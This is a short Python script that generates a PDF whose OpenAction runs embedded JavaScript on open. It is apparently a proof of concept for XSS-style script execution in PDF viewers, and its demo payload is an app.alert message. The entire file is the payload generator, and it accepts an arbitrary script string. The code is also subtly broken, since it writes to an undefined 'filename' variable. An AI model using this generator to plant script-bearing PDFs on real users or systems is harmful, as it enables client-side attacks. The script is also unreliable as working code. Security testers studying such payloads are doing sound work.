# -*- coding:utf-8 -*-

def create_xss_pdf(script_alert):
  with open(filename, "w") as file:
    file.write('''%PDF-1.7
    1 0 obj
    <</Pages 1 0 R /OpenAction 2 0 R>>
    2 0 obj
    <</S /JavaScript /JS (app.alert('{}'))>> 
    trailer
    <</Root 1 0 R>>'''.format(script_alert))

if __name__ == "__main__":
  create_xss_pdf("POC test for xss pdf.")
